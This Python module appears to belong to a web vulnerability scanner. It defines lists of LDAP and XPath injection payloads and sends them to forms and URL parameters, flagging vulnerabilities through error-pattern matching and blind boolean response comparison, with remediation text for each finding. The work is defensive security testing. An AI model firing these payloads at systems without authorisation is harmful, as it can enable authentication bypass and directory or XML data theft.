"""
LDAPXPathTester — LDAP and XPath Injection detection.
OWASP A03:2021 — Injection.

Tests for: LDAP injection in form fields and URL parameters,
XPath injection in XML-processing endpoints, and blind injection
via boolean and error-based techniques.
"""
import re
import logging
from .base_tester import BaseTester

logger = logging.getLogger(__name__)

# LDAP Injection payloads
LDAP_PAYLOADS = [
    '*',
    '*)(&',
    '*)(|(&',
    '*()|%26',
    'admin)(|(password=*)',
    '*)((|userPassword=*)',
    '\\00',
    '*()|(&(objectClass=*))',
    'admin)(!(&(1=0)',
    '*)(%26',
    '*(|(mail=*))',
    'x])(|(cn=*))//&password=x',
]

# LDAP error patterns
LDAP_ERROR_PATTERNS = [
    r'ldap_search', r'ldap_bind', r'ldap_connect',
    r'invalid\s+dn\s+syntax', r'bad\s+search\s+filter',
    r'ldap\s+error', r'ldaperr', r'ldap://|ldaps://',
    r'javax\.naming\.directory', r'com\.sun\.jndi',
    r'LDAPException', r'NamingException',
    r'invalid\s+filter', r'filter\s+error',
    r'malformed\s+filter',
]

# XPath Injection payloads
XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "x' or true() or 'x'='y",
    "1 or 1=1",
    "' or count(//*)>0 or '1'='1",
    "'] | //* | //*['",
    "admin' or '1'='1",
    "' and '1'='2",                   # False condition for blind detection
    "x'] | //user[name/text()='admin",
    "' or string-length(name(/*[1]))>1 or '1'='1",
    "x]|//*|//*[x",
]

# XPath error patterns
XPATH_ERROR_PATTERNS = [
    r'xpath', r'xmlsyntaxerror', r'lxml\.etree',
    r'invalid\s+expression', r'expression\s+error',
    r'DOMXPath', r'SimpleXMLElement',
    r'xml\.etree', r'XPathEvalError',
    r'XPathException', r'javax\.xml\.xpath',
    r'xmlParseError', r'XPath\s+syntax',
    r'evaluate\(\)', r'selectNodes',
    r'xmllint', r'XmlDocument',
]


class LDAPXPathTester(BaseTester):
    """Test for LDAP and XPath injection vulnerabilities."""

    TESTER_NAME = 'LDAP/XPath Injection'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []

        # 1. Test LDAP injection in forms
        vulns = self._test_ldap_form(page, depth)
        vulnerabilities.extend(vulns)

        # 2. Test LDAP injection in URL params
        vulns = self._test_ldap_params(page)
        vulnerabilities.extend(vulns)

        # 3. Test XPath injection in forms
        vulns = self._test_xpath_form(page, depth)
        vulnerabilities.extend(vulns)

        # 4. Test XPath injection in URL params
        vulns = self._test_xpath_params(page)
        vulnerabilities.extend(vulns)

        # 5. Blind XPath injection (deep only)
        if depth == 'deep':
            vulns = self._test_blind_xpath(page)
            vulnerabilities.extend(vulns)

        return vulnerabilities

    def _test_ldap_form(self, page, depth: str) -> list:
        """Test form fields for LDAP injection."""
        vulnerabilities = []

        for form in page.forms:
            # Focus on login/search forms likely to use LDAP
            form_html = str(form).lower()
            if not any(k in form_html for k in ('login', 'auth', 'search', 'user', 'ldap', 'directory')):
                continue

            target_url = form.action or page.url
            payloads = LDAP_PAYLOADS[:4] if depth == 'shallow' else LDAP_PAYLOADS[:8]

            for inp in form.inputs:
                if not inp.name or inp.input_type in ('submit', 'button', 'hidden', 'file'):
                    continue

                for payload in payloads:
                    data = {}
                    for fi in form.inputs:
                        if fi.name:
                            data[fi.name] = payload if fi.name == inp.name else (fi.value or 'test')

                    try:
                        response = self._make_request('POST', target_url, data=data)
                    except Exception:
                        continue

                    if response and self._has_ldap_error(response.text):
                        vulnerabilities.append(self._build_vuln(
                            name='LDAP Injection',
                            severity='critical',
                            category='LDAP Injection',
                            description=f'Form field "{inp.name}" at {target_url} is vulnerable '
                                       f'to LDAP injection. LDAP error messages were triggered.',
                            impact='Attackers can manipulate LDAP queries to bypass authentication, '
                                  'enumerate users, or extract directory information.',
                            remediation='Sanitize all user input before LDAP queries. '
                                       'Escape LDAP special characters (*, (, ), \\, NUL). '
                                       'Use parameterized LDAP filters. Implement input validation.',
                            cwe='CWE-90',
                            cvss=9.8,
                            affected_url=target_url,
                            evidence=f'Field: {inp.name}\nPayload: {payload}\n'
                                    f'LDAP error detected in response.',
                        ))
                        return vulnerabilities  # One finding is sufficient

        return vulnerabilities

    def _test_ldap_params(self, page) -> list:
        """Test URL parameters for LDAP injection."""
        vulnerabilities = []
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(page.url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return vulnerabilities

        for param_name in params:
            for payload in LDAP_PAYLOADS[:5]:
                modified = dict(params)
                modified[param_name] = [payload]

                new_query = urlencode(modified, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    response = self._make_request('GET', test_url)
                except Exception:
                    continue

                if response and self._has_ldap_error(response.text):
                    vulnerabilities.append(self._build_vuln(
                        name='LDAP Injection via URL Parameter',
                        severity='critical',
                        category='LDAP Injection',
                        description=f'URL parameter "{param_name}" is vulnerable to LDAP injection.',
                        impact='Attackers can modify LDAP queries to bypass authentication '
                              'or extract sensitive directory data.',
                        remediation='Escape LDAP special characters. Use parameterized filters. '
                                   'Validate input against allowlists.',
                        cwe='CWE-90',
                        cvss=9.8,
                        affected_url=test_url,
                        evidence=f'Parameter: {param_name}\nPayload: {payload}',
                    ))
                    return vulnerabilities

        return vulnerabilities

    def _test_xpath_form(self, page, depth: str) -> list:
        """Test form fields for XPath injection."""
        vulnerabilities = []

        for form in page.forms:
            target_url = form.action or page.url
            payloads = XPATH_PAYLOADS[:3] if depth == 'shallow' else XPATH_PAYLOADS[:7]

            for inp in form.inputs:
                if not inp.name or inp.input_type in ('submit', 'button', 'hidden', 'file'):
                    continue

                for payload in payloads:
                    data = {}
                    for fi in form.inputs:
                        if fi.name:
                            data[fi.name] = payload if fi.name == inp.name else (fi.value or 'test')

                    try:
                        response = self._make_request('POST', target_url, data=data)
                    except Exception:
                        continue

                    if response and self._has_xpath_error(response.text):
                        vulnerabilities.append(self._build_vuln(
                            name='XPath Injection',
                            severity='critical',
                            category='XPath Injection',
                            description=f'Form field "{inp.name}" at {target_url} is vulnerable '
                                       f'to XPath injection. XPath errors were triggered.',
                            impact='Attackers can manipulate XPath queries to bypass authentication, '
                                  'extract XML data, or cause denial of service.',
                            remediation='Use parameterized XPath queries (precompiled expressions). '
                                       'Sanitize user input. Avoid constructing XPath queries with '
                                       'string concatenation.',
                            cwe='CWE-643',
                            cvss=9.8,
                            affected_url=target_url,
                            evidence=f'Field: {inp.name}\nPayload: {payload}\n'
                                    f'XPath error detected.',
                        ))
                        return vulnerabilities

        return vulnerabilities

    def _test_xpath_params(self, page) -> list:
        """Test URL parameters for XPath injection."""
        vulnerabilities = []
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(page.url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return vulnerabilities

        for param_name in params:
            for payload in XPATH_PAYLOADS[:5]:
                modified = dict(params)
                modified[param_name] = [payload]

                new_query = urlencode(modified, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    response = self._make_request('GET', test_url)
                except Exception:
                    continue

                if response and self._has_xpath_error(response.text):
                    vulnerabilities.append(self._build_vuln(
                        name='XPath Injection via URL Parameter',
                        severity='critical',
                        category='XPath Injection',
                        description=f'URL parameter "{param_name}" is vulnerable to XPath injection.',
                        impact='Attackers can extract XML document data or bypass authentication.',
                        remediation='Use parameterized XPath queries. Validate input types.',
                        cwe='CWE-643',
                        cvss=9.8,
                        affected_url=test_url,
                        evidence=f'Parameter: {param_name}\nPayload: {payload}',
                    ))
                    return vulnerabilities

        return vulnerabilities

    def _test_blind_xpath(self, page) -> list:
        """Test for blind XPath injection using boolean conditions."""
        vulnerabilities = []
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(page.url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return vulnerabilities

        for param_name in params:
            # True condition
            modified_true = dict(params)
            modified_true[param_name] = ["' or '1'='1"]
            true_url = urlunparse(parsed._replace(query=urlencode(modified_true, doseq=True)))

            # False condition
            modified_false = dict(params)
            modified_false[param_name] = ["' and '1'='2"]
            false_url = urlunparse(parsed._replace(query=urlencode(modified_false, doseq=True)))

            try:
                true_resp = self._make_request('GET', true_url)
                false_resp = self._make_request('GET', false_url)
            except Exception:
                continue

            if not (true_resp and false_resp):
                continue

            # Compare response lengths — significant difference indicates boolean injection
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            if true_len > 0 and false_len > 0:
                ratio = max(true_len, false_len) / min(true_len, false_len)
                if ratio > 1.5 and true_resp.status_code == 200 and false_resp.status_code == 200:
                    vulnerabilities.append(self._build_vuln(
                        name='Blind XPath Injection',
                        severity='high',
                        category='XPath Injection',
                        description=f'URL parameter "{param_name}" appears vulnerable to blind '
                                   f'XPath injection. Boolean true/false conditions produce '
                                   f'significantly different response sizes.',
                        impact='Attackers can extract XML data one character at a time using '
                              'boolean-based blind techniques.',
                        remediation='Use parameterized XPath queries. Never concatenate user input.',
                        cwe='CWE-643',
                        cvss=8.6,
                        affected_url=page.url,
                        evidence=f'Parameter: {param_name}\n'
                                f'True condition length: {true_len}\n'
                                f'False condition length: {false_len}\n'
                                f'Ratio: {ratio:.2f}',
                    ))
                    break

        return vulnerabilities

    def _has_ldap_error(self, body: str) -> bool:
        """Check response for LDAP-related errors."""
        if not body:
            return False
        return any(re.search(p, body, re.IGNORECASE) for p in LDAP_ERROR_PATTERNS)

    def _has_xpath_error(self, body: str) -> bool:
        """Check response for XPath-related errors."""
        if not body:
            return False
        return any(re.search(p, body, re.IGNORECASE) for p in XPATH_ERROR_PATTERNS)
